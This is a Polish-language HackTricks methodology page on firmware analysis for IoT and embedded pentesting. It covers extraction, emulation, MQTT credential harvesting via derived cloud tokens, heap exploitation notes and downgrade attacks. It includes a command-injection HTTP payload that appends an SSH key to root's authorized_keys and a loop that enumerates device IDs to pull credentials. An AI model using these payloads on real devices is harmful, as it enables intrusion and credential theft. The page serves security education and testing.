# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy mają kontakt, oraz jej obsługę. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Gromadzenie informacji**

**Gromadzenie informacji** to kluczowy pierwszy etap poznawania budowy urządzenia i używanych przez nie technologii. Proces ten obejmuje zbieranie danych dotyczących:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów bootloadera
- Układu sprzętowego i dokumentacji datasheet
- Metryk codebase'u i lokalizacji kodu źródłowego
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source software'u poprzez ręczne i automatyczne procesy przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:

- **Bezpośrednio** ze źródła (developerzy, producenci)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** je z urządzenia poprzez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffując** żądania aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **hardcoded update endpoints**
- **Dumpując** dane z bootloadera lub sieci
- **Usuwając i odczytując** chip pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi wyłącznie przez UART: wymuszenie root shell przez env U-Boot w pamięci flash

Jeśli RX UART jest ignorowany (dostępne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję bloba środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję środowiska U-Boot, zmodyfikuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla bloba.
3. Zapisz ponownie wyłącznie partycję środowiska i uruchom urządzenie ponownie; shell powinien pojawić się na UART.

Jest to przydatne w przypadku urządzeń embedded, na których shell bootloadera jest wyłączony, ale partycję środowiska można zapisywać poprzez zewnętrzny dostęp do pamięci flash.

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak należy go analizować. Możesz w tym celu użyć różnych narzędzi:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`; jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby przeanalizować plik.

### Uzyskiwanie systemu plików

Korzystając z opisanych wcześniej narzędzi, takich jak `binwalk -ev <bin>`, powinno udać Ci się **wyodrębnić system plików**.\
Binwalk zwykle wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, który zazwyczaj jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie będzie mieć magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd**, aby wyodrębnić system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą później znajdować się w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware należy dokładnie je przeanalizować, aby zrozumieć jego strukturę i potencjalne vulnerabilities. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić strings, przeanalizować dane binarne oraz zrozumieć szczegóły dotyczące partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu nazwanego na podstawie typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magicznych bajtów, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza filesystemu

Po wyodrębnieniu filesystemu rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone demony sieciowe, hardcoded credentials, endpointy API, funkcjonalności serwerów aktualizacji, niezkodowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Najważniejsze lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Osadzone pliki binarne do dalszej analizy
- Popularne web servery i pliki binarne urządzeń IoT

W wykrywaniu poufnych informacji i luk w filesystemie pomagają następujące narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) oraz [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w filesystemie muszą zostać dokładnie przeanalizowane pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix oraz **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które mogłyby zostać wykorzystane.

## Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT za pomocą tokenów wyprowadzanych z URL

Wiele hubów IoT pobiera konfigurację właściwą dla danego urządzenia z endpointu cloud, który wygląda następująco:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i przedstawiany jako wielkie litery w zapisie szesnastkowym

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL i pobranie konfiguracji cloud, często ujawniającej dane uwierzytelniające MQTT w plaintext oraz prefiksy topiców.

Praktyczny workflow:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL konfiguracji cloud oraz adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień skrót na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskiwanie konfiguracji cloud i poświadczeń MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse plaintext MQTT i słabych topic ACLs (jeśli są dostępne)

- Użyj odzyskanych credentials, aby zasubskrybować maintenance topics i szukać wrażliwych zdarzeń:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za autoryzacją)

- Wiele ekosystemów zawiera bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny przyrostek.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed podjęciem prób masowej enumeracji.
- W miarę możliwości preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware'u.


Proces emulacji firmware'u umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware'u lub architektury, ale przeniesienie root filesystemu lub określonych binariów na urządzenie o zgodnej architekturze i endianness, takie jak Raspberry Pi, albo do wcześniej przygotowanej maszyny wirtualnej, może ułatwić dalsze testowanie.

### Emulacja pojedynczych binariów

Podczas badania pojedynczych programów kluczowe jest określenie endianness i architektury CPU programu.

#### Przykład z architekturą MIPS

Do emulacji binariów architektury MIPS można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
W przypadku MIPS (big-endian) używany jest `qemu-mips`, a w przypadku binariów little-endian właściwym wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny, a do emulacji wykorzystywany jest emulator `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają pełną emulację firmware, automatyzując ten proces i wspomagając dynamiczną analizę.

## Dynamiczna analiza w praktyce

Na tym etapie do analizy wykorzystywane jest rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu shell do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co może wymagać okazjonalnego ponownego uruchomienia emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony internetowe i usługi sieciowe oraz badać luki w bootloaderze. Testy integralności firmware mają kluczowe znaczenie dla identyfikacji potencjalnych luk typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania obejmuje interakcję z procesem lub binarium w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania luk za pomocą fuzzingu i innych technik.

W przypadku celów embedded bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w userlandzie systemu Linux. Przydatny workflow polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **RF frame** w eterze
2. **controller-side parser** w radio MCU
3. **serial/UART text or TLV protocol** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **application dispatcher** w głównym daemonie
5. **protocol-specific handler / state machine**

Taka architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne RF frames na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **message groups** i tablice dispatchera
- Które komunikaty mogą pochodzić z **network**, a które z samego kontrolera
- Dokładne **manufacturer-specific discriminator fields** (na przykład Zigbee `manufacturer_code` i custom `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas faz **commissioning**, discovery lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Zigbee 3.0 install codes ograniczają tę ekspozycję, dlatego odnotuj, czy testowane urządzenie faktycznie ich wymaga.

### Manufacturer-specific protocol handlers i osiągalność kontrolowana przez FSM

Vendor-specific Zigbee/ZCL commands są często lepszym celem niż standardized clusters, ponieważ trafiają do **custom parsing code** i wewnętrznych **FSMs**, które mają słabiej przetestowaną walidację.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Przeprowadź reverse engineering command dispatchera, aż znajdziesz **vendor-only handler**.
- Odzyskaj tablice **FSM state**, **event**, **check**, **action** i **next-state**.
- Zidentyfikuj **transitional states**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają state kontrolowany przez atakującego.
- Potwierdź, które prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że buggy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na timing packet replay z frameworka Python może być zbyt wolny. Bardziej niezawodne podejście polega na emulowaniu prawidłowego urządzenia na rzeczywistym hardware (na przykład **nRF52840**) z vendor-grade stack, aby można było ujawnić właściwe **endpoints**, **attributes** i timing commissioning.

### Klasa błędów fragmented-download w embedded daemonach

Powtarzająca się klasa błędów firmware występuje w **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje `malloc(total_size)`.
2. Późniejsze fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania względem **oryginalnego rozmiaru zaalokowanej pamięci**.

Pozwala to atakującemu wysłać:

- Pierwszy poprawny fragment z **małym** zadeklarowanym total size, aby wymusić małą alokację na heapie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany packet-local size, który spełnia świeżo wykonywane checks, a mimo to przepełnia pierwotnie zaalokowany buffer.

Gdy podatna ścieżka znajduje się za logiką commissioning, exploitation musi obejmować wystarczający poziom **device emulation**, aby przeprowadzić cel do oczekiwanego stanu model-download lub blob-download przed wysłaniem zniekształconych fragmentów.

### Wywoływanie `free()` przez protokół

W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie własnej obsługi błędów przez protokół**:<sup>[[8]](#references)</sup>

- Wyślij zniekształcone follow-up fragments, aby przeprowadzić FSM do stanów **retry** lub **error**.
- Przekrocz retry threshold, aby daemon **zresetował context** i zwolnił uszkodzony buffer.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić primitives po stronie allocatora, zanim proces ulegnie awarii z niezwiązanych przyczyn.

Jest to szczególnie przydatne przeciwko allocatorom typu **musl/uClibc/dlmalloc** w embedded Linux, gdzie uszkodzenie chunk metadata może zmienić logikę unlink/unbin w write primitive. Stabilny wzorzec polega na uszkodzeniu **size field**, aby przekierować przechodzenie allocatora do **fake chunks umieszczonych wewnątrz przepełnionego buffera**, zamiast natychmiastowego nadpisywania rzeczywistych bin pointers i powodowania awarii procesu.

## Binary Exploitation and Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Binary runtime protections w embedded systems są rzadkie, ale gdy występują, konieczne może być zastosowanie technik takich jak Return Oriented Programming (ROP).

### Uwagi dotyczące uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść checks (sane size, `fd = 0` oraz sąsiednie chunki rozpoznane jako „in use”).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączony, ale główny binary jest **non-PIE**, adresy `.data/.bss` wewnątrz binary są stabilne. Możesz wskazać region, który już przypomina prawidłowy heap chunk header, aby skierować fastbin allocation do **function pointer table**.
- **Parser-stopping NUL:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsing, zachowując końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mappingu i przejść do niego.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają prekonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane OS do analizy Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to distro przeznaczone do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając prekonfigurowane środowisko ze wszystkimi załadowanymi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, zawierający preinstalowane narzędzia do testowania bezpieczeństwa firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Nawet gdy vendor implementuje cryptographic signature checks dla obrazów firmware, **version rollback (downgrade) protection jest często pomijane**. Gdy boot- lub recovery-loader weryfikuje wyłącznie podpis za pomocą osadzonego public key, ale nie porównuje *version* (ani monotonic counter) obrazu, który ma zostać wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma prawidłowy podpis**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>

Typowy workflow ataku:

1. **Uzyskaj starszy podpisany obraz**
* Pobierz go z publicznego portalu pobierania vendora, CDN lub strony pomocy technicznej.
* Wyodrębnij go z aplikacji towarzyszących na urządzenia mobilne/desktopowe (np. z `assets/firmware/` wewnątrz Android APK).
* Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itd.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny wystawiony update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które przyjmują firmware blobs zakodowane w Base64, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command-injection dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz updates, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (zdegradowanym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade'em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Ekstrakcja Firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w APK/APEX bez szyfrowania, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykły `unzip` pozwalają wyodrębnić podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback działający wyłącznie w updaterze w projektach z układem A/B slotów

Niektórzy vendorzy implementują **ratchet** zapobiegający downgrade'om, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery albo agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później wyłącznie sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochrona przed rollbackiem nadal może zostać obejścia.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / monotoniczny licznik.
- Updater porównuje ratchet obrazu z wartością przechowywaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
- Bootloader nie parsuje tego ratchet i jedynie weryfikuje nagłówek, CRC oraz sygnaturę przed uruchomieniem wybranego slotu.
- Aktywacja slotu jest zapisywana osobno w tablicy partycji lub w liczniku generacji przypisanym do slotu i nie jest kryptograficznie powiązana z dokładnym digestem firmware, który został zweryfikowany.

Tworzy to w systemach z dwoma slotami prymityw **validate-one-image / boot-another-image**. Jeśli attacker może sprawić, że updater oznaczy slot B jako następny cel bootowania przy użyciu aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić downgraded image, ponieważ ufa wyłącznie wcześniej zapisanym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny podpisany** firmware do pasywnego slotu i uruchom normalną procedurę walidacji/przełączania, aby layout oznaczył ten slot jako następny aktywny.
2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wywołaj procedurę przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę walidacji wymuszającą ratchet i wykonaj bezpośredni reboot.
6. Bootloader wybierze promowany slot, zweryfikuje wyłącznie sygnaturę/integralność i uruchomi stary obraz.

Podczas reverse engineeringu implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu wyprowadzany z **flag ustawianych podczas bootowania**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedurę w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zapisanego layoutu**.
- Funkcję w stylu `part_write_layout()`, która jedynie zwiększa **licznik generacji** / flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie w ROM-ie / bootloaderze / etapach secure boot**.
- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako możliwy do bootowania, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport uwierzytelniania *update endpoint* jest odpowiednio chroniony (TLS + authentication)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać wyłącznie sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot może zostać zmodyfikowany po promocji?
* Po pomyślnym przełączeniu slotu urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji typu *partial* lub *backup* ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli któregoś z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, wykorzystaj poniższe projekty podatnego firmware jako punkt wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu osadzonego KMS/Vault

